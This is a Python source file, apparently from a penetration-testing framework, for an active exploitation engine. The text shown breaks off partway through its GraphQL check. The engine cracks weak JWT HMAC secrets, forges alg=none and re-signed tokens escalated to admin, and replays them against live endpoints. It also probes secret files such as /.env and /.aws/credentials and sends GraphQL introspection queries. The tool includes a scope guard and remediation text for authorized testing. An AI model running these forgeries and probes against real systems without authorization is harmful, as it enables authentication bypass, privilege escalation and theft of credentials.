#!/usr/bin/env python3
"""
ARISE — Unified Offensive Verification Engine (Module 19+24, rebuilt).
======================================================================

This replaces the two modules that used to run side-by-side and find nothing:

  • Module 24 "Advanced Attacks"        (jwt_attack / graphql_scanner / race /
                                          prototype_pollution / cache_poison / ws)
  • Module 19 "Extended Verification"   (SSRF / CRLF / SSTI / GraphQL / smuggling)

WHY THEY FOUND NOTHING (and what changed here)
----------------------------------------------
  - JWT was 100% OFFLINE — it never sent a forged token, so it could never prove
    a target ACCEPTS alg=none / a cracked secret. Here we forge and REPLAY, and
    only report when a tamper-control is rejected AND the forgery is accepted.
  - Extended Verification shelled out to external binaries (interactsh, crlfuzz,
    sstimap, graphw00f, smuggler). If they weren't installed — the normal case —
    every check silently returned 0. Here every check is native (stdlib+requests).
  - Race was GET-only with no session/body; len(ok)>1 fired on any idempotent 200.
    Here we only fire at state-changing methods and require a real success burst.
  - Everything ran in "safe mode" = confirm-only. Here we actively exploit.

HOW A BLACK-BOX PENTESTER WORKS (the design)
--------------------------------------------
  1. TARGETED, not sprayed — candidates come from the classified URL inventory
     (discovered_endpoints.jsonl: url_class / auth_state / input_functions /
     query_variants / methods), attack_routing lanes, and live hosts. WAF-blocked
     and dead endpoints are dropped before a single payload is sent.
  2. BASELINE FIRST — every check captures a clean control response, then attacks,
     then confirms with a DIFFERENTIAL. No differential → no finding. That is the
     no-false-positive contract: a finding exists only when the attack provably
     changed behaviour a control request did not.
  3. EVIDENCE — every finding carries the request line, the payload, the baseline
     vs. attack (status / length / timing / reflected marker) and a plain-English
     proof string, so it renders as real proof in the dashboard.

Output: one file, superset schema, consumed by both dashboard readers:
  <scan>/24_advanced_attacks/offensive_findings.jsonl
    → internet_intel folds *_findings.jsonl into the attack-surface console
    → dashboard vuln list reads offensive_findings.jsonl directly

Usage:
  python3 offensive_verify.py <scan_dir> [--target T] [--out-dir D]
      [--rate N] [--max-targets N] [--oob-domain d.oast.pro]
      [--only jwt,graphql,ssti,crlf,redirect,ssrf,proto,cache,race,ws]
      [--skip ...] [--timeout S] [--summary]

Non-mutating by default is NOT assumed — this tool sends real attack payloads.
Scope is still enforced (ai_probing.ScopeGuard): nothing off-target is touched.
"""
from __future__ import annotations

import sys as _sys, os as _os
_ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)


import argparse
import base64
import concurrent.futures
import hashlib
import hmac
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except Exception:  # pragma: no cover
    requests = None

try:
    from ai.ai_probing import ScopeGuard  # SSRF/scope firewall shared with the rest of ARISE
except Exception:
    ScopeGuard = None


# ---------------------------------------------------------------------------
# HTTP core — one shared session, global rate limiter, evidence capture
# ---------------------------------------------------------------------------

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36 ARISE-offensive")


class _RateLimiter:
    def __init__(self, rate):
        self.min_interval = 1.0 / max(1, rate)
        self._lock = threading.Lock()
        self._last = 0.0

    def wait(self):
        with self._lock:
            now = time.monotonic()
            delta = now - self._last
            if delta < self.min_interval:
                time.sleep(self.min_interval - delta)
            self._last = time.monotonic()


class Http:
    """Thin, evidence-friendly HTTP wrapper. Never raises to the caller."""

    def __init__(self, rate=25, timeout=12, scope=None):
        self.rl = _RateLimiter(rate)
        self.timeout = timeout
        self.scope = scope

    def in_scope(self, url):
        if self.scope is None:
            return True
        try:
            return self.scope.in_scope(url)
        except Exception:
            return False

    def request(self, method, url, *, headers=None, data=None, json_body=None,
                allow_redirects=False, timeout=None, cookies=None):
        if requests is None:
            return None
        if not self.in_scope(url):
            return None
        self.rl.wait()
        h = {"User-Agent": UA, "Accept": "*/*"}
        if headers:
            h.update(headers)
        try:
            t0 = time.monotonic()
            r = requests.request(
                method, url, headers=h, data=data, json=json_body,
                cookies=cookies, timeout=timeout or self.timeout, verify=False,
                allow_redirects=allow_redirects,
            )
            r._arise_elapsed = time.monotonic() - t0  # type: ignore
            return r
        except Exception:
            return None

    def get(self, url, **kw):
        return self.request("GET", url, **kw)

    def post(self, url, **kw):
        return self.request("POST", url, **kw)


def body_of(resp, cap=200_000):
    if resp is None:
        return ""
    try:
        return (resp.text or "")[:cap]
    except Exception:
        return ""


# ---------------------------------------------------------------------------
# CDN/WAF infrastructure: never test, never trust
# ---------------------------------------------------------------------------
_CDN_INFRA_PATH_RE = re.compile(
    r"(?:^|/)(?:cdn-cgi|__cf_|_cf_chl|challenge-platform|"
    r"_bx_html|akamai|_Incapsula_Resource)", re.I)

_WAF_BODY_SIGS = [
    "cf-chl-bypass", "challenge-platform", "_cf_chl_opt",
    "Just a moment...", "Checking your browser",
    "Attention Required! | Cloudflare",
    "cf-spinner-please-wait", "cf-error-details",
    "Access Denied</title>",
    "akamaized.net", "AkamaiGHost",
    "_Incapsula_Resource",
    "ddos-protection by", "DDoS protection by",
]


def _is_cdn_infra_path(url_or_path: str) -> bool:
    path = urllib.parse.urlsplit(url_or_path).path if "://" in url_or_path else url_or_path
    return bool(_CDN_INFRA_PATH_RE.search(path))


def _is_waf_response(resp) -> bool:
    if resp is None:
        return False
    body = body_of(resp, 8_000)
    return any(sig in body for sig in _WAF_BODY_SIGS)


def resp_headers_str(resp):
    if resp is None:
        return ""
    try:
        return "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    except Exception:
        return ""


def host_of(url):
    try:
        return urllib.parse.urlsplit(url).netloc.split("@")[-1]
    except Exception:
        return url


# ---------------------------------------------------------------------------
# Finding — one superset record both dashboard readers understand
# ---------------------------------------------------------------------------

_SEV_RANK = {"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1}


@dataclass
class Finding:
    check: str                      # jwt / graphql / ssti / crlf / redirect / ssrf / proto / cache / race / ws
    module: str                     # 24_advanced_attacks module id (for internet_intel fold)
    severity: str
    title: str
    host: str
    url: str
    evidence: str                   # plain-english proof
    remediation: str
    confidence: str = "confirmed"   # confirmed | exploited | probable
    verification: str = ""          # how it was proven (differential / crypto-proof / oob …)
    parameter: str = ""
    category: str = ""
    # rich, structured proof captured from the wire
    request_line: str = ""
    payload: str = ""
    baseline: dict = field(default_factory=dict)
    attack: dict = field(default_factory=dict)
    extra: dict = field(default_factory=dict)

    def record(self):
        # Superset keys: dashboard "Extended Verification" reader uses
        # template/check/tool/verification/parameter/safe_mode; internet_intel
        # adv-fold uses module/title/severity/url/host/evidence/impact/confidence.
        return {
            "module": self.module,
            "check": self.check,
            "tool": "offensive_verify",
            "template": self.title,
            "title": self.title,
            "severity": self.severity,
            "host": self.host,
            "url": self.url,
            "parameter": self.parameter,
            "category": self.category,
            "evidence": self.evidence,
            "impact": self.evidence,
            "remediation": self.remediation,
            "confidence": self.confidence,
            "verification": self.verification,
            "safe_mode": False,
            "request_line": self.request_line,
            "payload": self.payload,
            "baseline": self.baseline,
            "attack": self.attack,
            "extra": self.extra,
        }


def _snap(resp):
    """A compact response snapshot for evidence."""
    if resp is None:
        return {"status": None, "len": 0, "elapsed": None}
    try:
        return {
            "status": resp.status_code,
            "len": len(resp.content or b""),
            "elapsed": round(getattr(resp, "_arise_elapsed", 0.0), 3),
            "content_type": resp.headers.get("Content-Type", ""),
        }
    except Exception:
        return {"status": None, "len": 0, "elapsed": None}


# ---------------------------------------------------------------------------
# Target loader — pull the classified inventory the rest of ARISE built
# ---------------------------------------------------------------------------

RESOURCE_EXT = re.compile(
    r"\.(png|jpe?g|gif|svg|css|woff2?|ttf|ico|webp|mp4|mp3|pdf|zip|gz|map)(\?|$|#)", re.I)


def _iter_jsonl(path):
    try:
        with open(path, errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    yield json.loads(line)
                except Exception:
                    continue
    except Exception:
        return


def _read_lines(path):
    try:
        with open(path, errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return []


@dataclass
class Endpoint:
    url: str                # concrete, probe-able
    host: str
    path: str
    status: int = 0
    method: str = "GET"
    methods: list = field(default_factory=lambda: ["GET"])
    url_class: str = "unknown"
    auth_state: str = "unknown"
    sensitivity: str = "normal"
    query_variants: list = field(default_factory=list)
    input_functions: list = field(default_factory=list)
    routed_to: list = field(default_factory=list)
    has_params: bool = False


class Inventory:
    """Loads and classifies candidates for each check from the scan dir."""

    def __init__(self, scan_dir, scope=None):
        self.scan = Path(scan_dir)
        self.scope = scope
        self.endpoints: list[Endpoint] = []
        self.hosts: list[str] = []
        self.ws_urls: set[str] = set()
        self._load()

    # -- helpers -------------------------------------------------------------
    def _ok_scope(self, url):
        if self.scope is None:
            return True
        try:
            return self.scope.in_scope(url)
        except Exception:
            return False

    def _load(self):
        self._load_hosts()
        self._load_endpoints()
        self._load_ws()

    def _load_hosts(self):
        for rel in ("04_http_discovery/http_hosts.txt",
                    "04_http_discovery/http_urls.txt"):
            for l in _read_lines(self.scan / rel):
                if l.startswith("http") and self._ok_scope(l):
                    self.hosts.append(l.rstrip("/"))
        seen, out = set(), []
        for h in self.hosts:
            base = h.split("?")[0].rstrip("/")
            if base not in seen:
                seen.add(base)
                out.append(base)
        self.hosts = out

    def _load_endpoints(self):
        inv = self.scan / "08_directory_discovery/discovered_endpoints.jsonl"
        if inv.exists():
            for rec in _iter_jsonl(inv):
                if rec.get("blocked_by_waf"):
                    continue
                url = rec.get("sample_url") or rec.get("url") or ""
                if not url.startswith("http") or not self._ok_scope(url):
                    continue
                if RESOURCE_EXT.search(url):
                    continue
                if _is_cdn_infra_path(url):
                    continue
                q = urllib.parse.urlsplit(url).query
                ep = Endpoint(
                    url=url,
                    host=rec.get("host") or host_of(url),
                    path=rec.get("path") or urllib.parse.urlsplit(url).path,
                    status=int(rec.get("status") or 0),
                    method=(rec.get("method") or "GET").upper(),
                    methods=[m.upper() for m in (rec.get("methods") or [rec.get("method") or "GET"])],
                    url_class=rec.get("url_class") or "unknown",
                    auth_state=rec.get("auth_state") or "unknown",
                    sensitivity=rec.get("sensitivity") or "normal",
                    query_variants=rec.get("query_variants") or [],
                    input_functions=rec.get("input_functions") or [],
                    routed_to=rec.get("routed_to") or [],
                    has_params=bool(q),
                )
                self.endpoints.append(ep)
        # Fallback: crawl + gau URLs if the inventory is thin.
        if len(self.endpoints) < 5:
            for rel in ("09_crawling/all_urls.txt",
                        "01_asset_discovery/gau_urls.txt",
                        "11_param_fuzzing/urls_with_params.txt"):
                for u in _read_lines(self.scan / rel):
                    if not u.startswith("http") or RESOURCE_EXT.search(u):
                        continue
                    if not self._ok_scope(u) or _is_cdn_infra_path(u):
                        continue
                    q = urllib.parse.urlsplit(u).query
                    self.endpoints.append(Endpoint(
                        url=u, host=host_of(u),
                        path=urllib.parse.urlsplit(u).path,
                        has_params=bool(q)))
        # de-dup by (host, path, sorted query-keys)
        seen, out = set(), []
        for ep in self.endpoints:
            sp = urllib.parse.urlsplit(ep.url)
            keys = tuple(sorted(urllib.parse.parse_qs(sp.query).keys()))
            k = (ep.host, sp.path, keys, ep.method)
            if k not in seen:
                seen.add(k)
                out.append(ep)
        self.endpoints = out

    def _load_ws(self):
        for rel in ("20_api_deep_discovery/xhr_intercepted.txt",
                    "20_api_deep_discovery/input_functions.jsonl",
                    "09_crawling/all_urls.txt"):
            p = self.scan / rel
            if not p.exists():
                continue
            for l in _read_lines(p):
                for tok in re.split(r'["\'\s,]+', l):
                    if tok.startswith(("ws://", "wss://")):
                        self.ws_urls.add(tok)

    # -- typed candidate sets ------------------------------------------------
    def param_targets(self, cap=400):
        """URLs that carry query parameters (SSTI/CRLF/redirect/SSRF/proto-query)."""
        out = [ep for ep in self.endpoints if ep.has_params]
        return out[:cap]

    def post_targets(self, cap=200):
        """State-changing endpoints (race / proto-json / mass-assign)."""
        out = []
        for ep in self.endpoints:
            methods = set(ep.methods) | {ep.method}
            has_state = bool(methods & {"POST", "PUT", "PATCH", "DELETE"})
            has_fn = any((f.get("method") or "").upper() in ("POST", "PUT", "PATCH")
                         for f in ep.input_functions)
            if has_state or has_fn:
                out.append(ep)
        return out[:cap]

    def graphql_candidates(self, cap=120):
        cands = set()
        # 1) endpoints already classified/hinted graphql
        for ep in self.endpoints:
            u = ep.url.lower()
            if ("graphql" in u or "/gql" in u or ep.url_class == "graphql"
                    or "graphql" in (ep.routed_to or [])):
                cands.add(ep.url.split("#")[0])
        # 2) canonical paths on each live host
        paths = ["/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
                 "/query", "/gql", "/graphql/console", "/graphiql", "/api/gql"]
        for h in self.hosts:
            for p in paths:
                cands.add(h + p)
        return list(cands)[:cap]

    def redirect_targets(self, cap=250):
        """Param URLs whose param name looks like a redirect sink."""
        SINK = re.compile(r"(?:redirect|return|next|url|dest|to|continue|goto|"
                          r"callback|forward|out|target|link|redir)", re.I)
        out = []
        for ep in self.param_targets(cap * 2):
            qs = urllib.parse.parse_qs(urllib.parse.urlsplit(ep.url).query)
            if any(SINK.search(k) for k in qs):
                out.append(ep)
        return out[:cap]

    def ssrf_targets(self, cap=250):
        SINK = re.compile(r"(?:url|uri|link|src|dest|redirect|feed|host|domain|"
                          r"callback|webhook|proxy|fetch|file|page|load|image|"
                          r"img|remote|endpoint|api|target|site|source|path|data)", re.I)
        out = []
        for ep in self.param_targets(cap * 2):
            qs = urllib.parse.parse_qs(urllib.parse.urlsplit(ep.url).query)
            if any(SINK.search(k) for k in qs):
                out.append(ep)
        return out[:cap]

    def cache_targets(self, cap=150):
        # homepage hosts + a spread of param/static-ish paths
        out = list(self.hosts)
        for ep in self.endpoints[:cap]:
            out.append(ep.url)
        seen, res = set(), []
        for u in out:
            if u not in seen:
                seen.add(u)
                res.append(u)
        return res[:cap]

    def sensitive_targets(self, cap=300):
        """All endpoints classified as sensitive by the URL inventory, PLUS
        well-known probe paths that might not have been in the wordlist."""
        out = []
        seen = set()
        # 1) Inventory-classified sensitive endpoints (admin/upload/debug/…)
        for ep in self.endpoints:
            if ep.sensitivity == "sensitive" or "sensitive-review" in (ep.routed_to or []):
                if ep.url not in seen:
                    seen.add(ep.url)
                    out.append(ep)
        # 2) Path-keyword filter on ALL endpoints the old checks would skip
        #    (no params, GET-only) — these are exactly the ones that fall through
        SENS = re.compile(
            r"/(?:admin|wp-admin|wp-login|wp-json|wp-config|wp-includes|"
            r"upload|uploads|file|files|backup|backups|dump|export|import|"
            r"debug|trace|profiler|actuator|server-status|server-info|"
            r"\.env|\.git|\.svn|\.hg|\.DS_Store|\.htaccess|\.htpasswd|"
            r"phpinfo|info\.php|test|dev|staging|internal|private|secret|"
            r"console|panel|dashboard|manage|manager|phpmyadmin|adminer|"
            r"config|settings|setup|install|cgi-bin|xmlrpc|api-docs|"
            r"swagger|openapi|graphiql|elmah|error_log|access_log"
            r")", re.I)
        for ep in self.endpoints:
            if ep.url in seen:
                continue
            if SENS.search(ep.path):
                seen.add(ep.url)
                out.append(ep)
        # 3) Probe well-known paths on each host that may not be in any wordlist
        PROBES = [
            "/.env", "/.git/config", "/.git/HEAD", "/.svn/entries",
            "/.DS_Store", "/.htpasswd", "/wp-config.php.bak",
            "/server-status", "/server-info", "/phpinfo.php", "/info.php",
            "/actuator/env", "/actuator/heapdump", "/actuator/health",
            "/debug", "/trace", "/_profiler", "/elmah.axd",
            "/swagger.json", "/openapi.json", "/api-docs",
            "/wp-login.php", "/wp-admin/", "/xmlrpc.php",
            "/config.json", "/package.json", "/composer.json",
            "/.aws/credentials", "/robots.txt", "/sitemap.xml",
            "/crossdomain.xml", "/clientaccesspolicy.xml",
            "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
            "/backup.zip", "/backup.tar.gz", "/site.tar.gz",
            "/.well-known/security.txt",
        ]
        for h in self.hosts[:60]:
            for p in PROBES:
                url = h + p
                if url not in seen:
                    seen.add(url)
                    out.append(Endpoint(url=url, host=host_of(h), path=p,
                                        sensitivity="sensitive"))
        return out[:cap]


# ===========================================================================
# CHECK: JWT — offline crypto proof + ACTIVE forge-and-replay
# ===========================================================================

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*")

WEAK_SECRETS = [
    "", "secret", "secret123", "password", "123456", "changeme", "your-256-bit-secret",
    "jwt_secret", "jwtsecret", "supersecret", "mysecretkey", "key", "test", "qwerty",
    "admin", "default", "s3cr3t", "abc123", "letmein", "null", "development",
    "production", "staging", "secretkey", "secret_key", "my-secret", "topsecret",
    "password123", "passw0rd", "root", "guest", "demo", "signingkey", "signing_key",
    "hmac", "jwt", "token", "app_secret", "api_secret", "private_key", "keyboardcat",
    "changethis", "django-insecure", "flask", "express", "hello", "helloworld",
    "your_jwt_secret", "your-secret-key", "P@ssw0rd", "1234567890",
]

_SENSITIVE_CLAIMS = ("role", "roles", "admin", "is_admin", "isadmin", "scope",
                     "scopes", "permissions", "perms", "group", "groups", "priv",
                     "privilege", "authority", "authorities", "acl", "tenant", "user_type")


def _b64url_decode(seg):
    seg += "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg.encode())


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _jwt_decode(token):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    return header, payload, parts


def _crack_hmac(parts, header, secrets):
    alg = (header.get("alg") or "").upper()
    fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
          "HS512": hashlib.sha512}.get(alg)
    if not fn:
        return None
    signing_input = (parts[0] + "." + parts[1]).encode()
    try:
        want = _b64url_decode(parts[2])
    except Exception:
        return None
    for sec in secrets:
        if hmac.compare_digest(hmac.new(sec.encode(), signing_input, fn).digest(), want):
            return sec, fn
    return None


def _forge_none(header, payload):
    h = dict(header); h["alg"] = "none"
    return _b64url(json.dumps(h, separators=(",", ":")).encode()) + "." + \
           _b64url(json.dumps(payload, separators=(",", ":")).encode()) + "."


def _forge_hs(header, payload, secret, fn):
    h = dict(header)
    signing_input = (_b64url(json.dumps(h, separators=(",", ":")).encode()) + "." +
                     _b64url(json.dumps(payload, separators=(",", ":")).encode()))
    sig = hmac.new(secret.encode(), signing_input.encode(), fn).digest()
    return signing_input + "." + _b64url(sig)


def _harvest_jwts(scan_dir: Path):
    """Harvest tokens + the header/cookie name they travelled in, if visible."""
    tokens = {}
    exts = (".txt", ".json", ".jsonl", ".log", ".js", ".har", ".html")
    for p in scan_dir.rglob("*"):
        if not p.is_file() or p.suffix.lower() not in exts:
            continue
        try:
            if p.stat().st_size > 8_000_000:
                continue
            data = p.read_text(errors="ignore")
        except Exception:
            continue
        for m in JWT_RE.findall(data):
            if m not in tokens:
                # Was it a cookie? look for `name=eyJ...`
                cm = re.search(r'([A-Za-z0-9_\-]{2,40})=' + re.escape(m[:16]), data)
                tokens[m] = cm.group(1) if cm else None
    return tokens


def check_jwt(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    tokens = _harvest_jwts(inv.scan)
    if not tokens:
        return findings

    # Endpoints we can replay a token against: prefer API / authenticated /
    # 200-or-401 endpoints. GET only (idempotent) for the replay probe.
    replay_eps = []
    for ep in inv.endpoints:
        if ep.method != "GET" and "GET" not in ep.methods:
            continue
        if ep.status in (200, 401, 403) or ep.auth_state in ("authenticated", "unknown"):
            if ep.url_class in ("api", "auth", "unknown") or "/api" in ep.path.lower():
                replay_eps.append(ep)
    replay_eps = replay_eps[:40]

    for token, cookie_name in list(tokens.items())[:20]:
        dec = _jwt_decode(token)
        if not dec:
            continue
        header, payload, parts = dec
        alg = (header.get("alg") or "").upper()
        tok_short = token[:20] + "…"
        priv = [c for c in _SENSITIVE_CLAIMS if c in {k.lower() for k in payload}]

        forged = None
        proof = None
        sev = "high"

        # 1) alg=none in the token itself → the issuer accepts unsigned tokens.
        if alg in ("NONE", ""):
            forged = _forge_none(header, _bump_privs(payload))
            proof = f"token header alg='{header.get('alg')}' — unsigned tokens issued"
            sev = "critical"

        # 2) weak HMAC secret cracked OFFLINE = cryptographic proof (no FP).
        if forged is None and alg.startswith("HS"):
            cr = _crack_hmac(parts, header, _load_secrets(opts))
            if cr:
                secret, fn = cr
                forged = _forge_hs(header, _bump_privs(payload), secret, fn)
                proof = (f"HMAC signature verifies with weak secret "
                         f"'{secret or '(empty)'}' — full token forgery")
                sev = "critical"

        # 3) alg=none forgery attempt even on signed tokens (many libs accept it).
        none_forge = _forge_none(header, _bump_privs(payload)) if forged is None else None

        # Offline finding first (always emit crypto-proof cases).
        if forged is not None and proof is not None:
            fnd = Finding(
                check="jwt", module="jwt_attack", severity=sev,
                title="JWT forgeable — " + ("alg=none accepted" if alg in ("NONE", "")
                                            else "weak HMAC secret cracked"),
                host=payload.get("iss") and host_of(payload["iss"]) or "token",
                url="", evidence=proof + (f"; privilege claims present: {priv}" if priv else ""),
                remediation="Reject alg=none; pin the expected algorithm; rotate to a long "
                            "random secret (>=32 bytes) in a secret manager; verify sig server-side.",
                confidence="confirmed", verification="offline-crypto-proof",
                parameter="Authorization", category="Authentication / JWT",
                payload=forged[:80] + "…",
            )
            # ACTIVE escalation: replay the forged token, prove acceptance.
            exploited = _jwt_active_replay(http, replay_eps, token, forged,
                                           cookie_name, fnd)
            findings.append(fnd)
            if exploited:
                findings.append(exploited)
            continue

        # 4) No offline break — try active alg-confusion / none-injection anyway,
        #    but ONLY report if a tamper-control is rejected and the forgery works.
        if none_forge is not None and replay_eps:
            fnd = Finding(
                check="jwt", module="jwt_attack", severity="critical",
                title="JWT alg=none forgery accepted by server",
                host=host_of(replay_eps[0].url), url="",
                evidence="", remediation="Reject alg=none; pin the expected algorithm.",
                confidence="exploited", verification="forge-and-replay-differential",
                parameter="Authorization", category="Authentication / JWT",
                payload=none_forge[:80] + "…",
            )
            exploited = _jwt_active_replay(http, replay_eps, token, none_forge,
                                           cookie_name, fnd, standalone=True)
            if exploited:
                findings.append(exploited)

        # 5) RS256→HS256 algorithm-confusion candidate (offline analysis).
        if (alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS")) \
                and not header.get("kid"):
            findings.append(Finding(
                check="jwt", module="jwt_attack", severity="high",
                title="RS256->HS256 algorithm-confusion candidate",
                host=payload.get("iss") and host_of(payload["iss"]) or "token",
                url="", parameter="Authorization", category="Authentication / JWT",
                evidence=f"asymmetric alg '{alg}' with no kid pinning — if the server also "
                         f"accepts HS* and uses the public key as an HMAC secret, tokens can "
                         f"be forged with the public key as the signing secret.",
                remediation="Pin the exact algorithm server-side; never let alg switch "
                            "between asymmetric and HMAC; use kid to bind to a specific key.",
                confidence="probable", verification="offline-header-analysis",
            ))

        # 6) kid header injection surface (path traversal / SQLi in kid).
        kid = header.get("kid")
        if isinstance(kid, str) and re.search(
                r"[/\\]|\.\.|'|\"|;|\bunion\b|\bselect\b", kid, re.I):
            findings.append(Finding(
                check="jwt", module="jwt_attack", severity="high",
                title="JWT kid header injection surface",
                host=payload.get("iss") and host_of(payload["iss"]) or "token",
                url="", parameter="kid", category="Authentication / JWT",
                evidence=f"kid='{kid}' contains path/SQL characters — kid is often used to "
                         f"load a key by filename or DB lookup, enabling traversal/SQLi to "
                         f"control the signing key and forge arbitrary tokens.",
                remediation="Treat kid as an opaque key identifier; look it up against a "
                            "fixed allowlist; never use it in file paths or SQL queries.",
                confidence="probable", verification="offline-kid-analysis",
                payload=f"kid: {kid}",
            ))

        # 7) Missing or expired exp — indefinitely replayable tokens.
        exp = payload.get("exp")
        if exp is None:
            findings.append(Finding(
                check="jwt", module="jwt_attack", severity="medium",
                title="JWT has no expiry (exp) — indefinitely replayable",
                host=payload.get("iss") and host_of(payload["iss"]) or "token",
                url="", parameter="exp", category="Authentication / JWT",
                evidence="payload has no 'exp' claim — a stolen token never expires.",
                remediation="Set a short exp and validate it server-side.",
                confidence="confirmed", verification="offline-payload-analysis",
            ))
        elif isinstance(exp, (int, float)) and exp < time.time():
            findings.append(Finding(
                check="jwt", module="jwt_attack", severity="low",
                title="JWT is expired (test replay acceptance)",
                host=payload.get("iss") and host_of(payload["iss"]) or "token",
                url="", parameter="exp", category="Authentication / JWT",
                evidence=f"exp={int(exp)} is in the past — verify the server rejects it.",
                remediation="Ensure exp is enforced server-side, not just present.",
                confidence="confirmed", verification="offline-payload-analysis",
            ))
    return findings


def _bump_privs(payload):
    p = dict(payload)
    for k in list(p.keys()):
        lk = k.lower()
        if lk in ("role", "roles"):
            p[k] = "admin"
        elif lk in ("is_admin", "isadmin", "admin"):
            p[k] = True
        elif lk in ("scope", "scopes"):
            p[k] = "admin"
        elif lk == "user_type":
            p[k] = "admin"
    return p


def _jwt_active_replay(http, replay_eps, real_token, forged_token, cookie_name,
                       base_finding, standalone=False):
    """Prove the server ENFORCES signatures (tamper rejected) yet ACCEPTS the
    forgery (differential). Only then do we assert exploitation."""
    def send(url, token):
        # try Authorization: Bearer, then cookie if we know the name
        if cookie_name:
            return http.get(url, cookies={cookie_name: token})
        return http.get(url, headers={"Authorization": "Bearer " + token})

    # A tampered signature = flip the last char of the signature segment.
    tp = real_token.rsplit(".", 1)
    tampered = (tp[0] + "." + (("A" if tp[1][:1] != "A" else "B") + tp[1][1:])) if len(tp) == 2 else real_token

    for ep in replay_eps:
        url = ep.url.split("#")[0]
        r_real = send(url, real_token)
        if r_real is None or r_real.status_code >= 500:
            continue
        # We need an endpoint that actually authenticates: valid token → 2xx.
        if not (200 <= r_real.status_code < 300):
            continue
        r_tamper = send(url, tampered)
        if r_tamper is None:
            continue
        # Signature must be ENFORCED for this to mean anything (no-FP gate):
        if 200 <= r_tamper.status_code < 300 and _similar(r_real, r_tamper):
            # endpoint accepts anything → not an auth oracle, drop it
            continue
        r_forge = send(url, forged_token)
        if r_forge is None:
            continue
        forged_ok = (200 <= r_forge.status_code < 300) and _similar(r_real, r_forge)
        if forged_ok:
            evid = (f"valid token → HTTP {r_real.status_code}; tampered-signature "
                    f"token → HTTP {r_tamper.status_code} (rejected); FORGED token → "
                    f"HTTP {r_forge.status_code} (accepted, body matches authenticated "
                    f"response). Server does not verify the signature it should.")
            fnd = Finding(
                check="jwt", module="jwt_attack", severity="critical",
                title=base_finding.title + " — forged token accepted (exploited)",
                host=host_of(url), url=url, evidence=evid,
                remediation=base_finding.remediation,
                confidence="exploited", verification="forge-and-replay-differential",
                parameter=("Cookie:" + cookie_name) if cookie_name else "Authorization",
                category="Authentication / JWT",
                request_line=f"GET {url} (forged JWT)",
                payload=forged_token[:80] + "…",
                baseline={"valid_token": _snap(r_real), "tampered_token": _snap(r_tamper)},
                attack=_snap(r_forge),
            )
            return fnd
    return None


def _similar(r1, r2, tol=0.15):
    try:
        l1, l2 = len(r1.content or b""), len(r2.content or b"")
        if l1 == 0 and l2 == 0:
            return True
        big = max(l1, l2, 1)
        return abs(l1 - l2) / big <= tol
    except Exception:
        return False


def _load_secrets(opts):
    secs = list(WEAK_SECRETS)
    wl = opts.get("jwt_wordlist")
    if wl and os.path.isfile(wl):
        secs.extend(w for w in _read_lines(wl))
    seen, out = set(), []
    for s in secs:
        if s not in seen:
            seen.add(s)
            out.append(s)
    return out


# ===========================================================================
# CHECK: GraphQL — active introspection / suggestion / batching, schema evidence
# ===========================================================================

_INTROSPECT = {"query": "query IntrospectionQuery{__schema{queryType{name} "
                        "types{name kind}}}"}
_INTROSPECT_MIN = {"query": "{__schema{queryType{name}}}"}
_BAD_FIELD = {"query": "{__typenameeee}"}


def check_graphql(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    for url in inv.graphql_candidates():
        # Confirm it's actually GraphQL first (drop invalid targets): a POSTed
        # introspection must return GraphQL-shaped JSON (data.__schema or a
        # GraphQL "errors" array), else this path isn't a GraphQL endpoint.
        r = http.post(url, json_body=_INTROSPECT,
                      headers={"Content-Type": "application/json"})
        if r is None:
            continue
        body = body_of(r, 200_000)
        try:
            j = json.loads(body) if body.strip().startswith(("{", "[")) else None
        except Exception:
            j = None
        is_graphql = bool(j and (
            ("data" in j and isinstance(j.get("data"), dict))
            or ("errors" in j and isinstance(j.get("errors"), list))))
        if not is_graphql:
            # Try a GET introspection (some servers only accept GET) before giving up
            gurl = url + ("&" if urllib.parse.urlsplit(url).query else "?") + \
                "query=" + urllib.parse.quote("{__schema{queryType{name}}}")
            r = http.get(gurl)
            body = body_of(r, 200_000)
            try:
                j = json.loads(body) if body.strip().startswith("{") else None
            except Exception:
                j = None
            if not (j and "data" in j):
                continue

        host = host_of(url)
        # 1) Introspection enabled = confirmed (schema leak, concrete evidence).
        schema = None
        try:
            schema = (j or {}).get("data", {}).get("__schema")
        except Exception:
            schema = None
        if schema and schema.get("queryType"):
            types = schema.get("types") or []
            type_names = [t.get("name") for t in types if isinstance(t, dict)][:25]
            findings.append(Finding(
                check="graphql", module="graphql_scanner", severity="high",
                title="GraphQL introspection enabled", host=host, url=url,
                evidence=f"__schema introspection returned the full type system "
                         f"({len(types)} types). Query root: "
                         f"{schema['queryType'].get('name')}. Sample types: "
                         f"{', '.join([t for t in type_names if t][:12])}",
                remediation="Disable introspection in production; expose it only in dev.",
                confidence="confirmed", verification="introspection-schema-dump",
                category="GraphQL Exposure",
                request_line=f"POST {url} {json.dumps(_INTROSPECT_MIN)}",
                attack=_snap(r), extra={"types_sample": type_names},
            ))
        else:
            # 2) Introspection off but field suggestions on = schema inference.
            rs = http.post(url, json_body=_BAD_FIELD,
                           headers={"Content-Type": "application/json"})
